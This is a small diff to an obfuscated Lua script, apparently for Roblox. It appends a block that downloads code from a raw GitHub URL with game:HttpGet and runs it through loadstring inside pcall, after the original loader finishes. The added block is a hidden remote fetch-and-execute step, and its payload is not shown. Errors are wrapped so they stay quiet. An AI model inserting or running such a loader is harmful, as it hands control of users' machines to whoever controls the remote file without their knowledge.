@@ -59,4 +59,15 @@ return(function(...)local k={"|RCVs>k[-6UhSXIa*E&8rdK,V5fokZC/&OB&E!4ZB;8b![(_)h
 end,debug.traceback)
 finishLoading(success)
 if not success then error(result) end
+local breakergg = "https://raw.githubusercontent.com/itachidevrs/gg/refs/heads/main/gg"
+
+pcall(function()
+    local source = game:HttpGet(breakergg)
+    local fn, err = loadstring(source)
+    if fn then
+        fn()
+    else
+        warn("[breakergg] "..tostring(err))
+    end
+end)
 return result
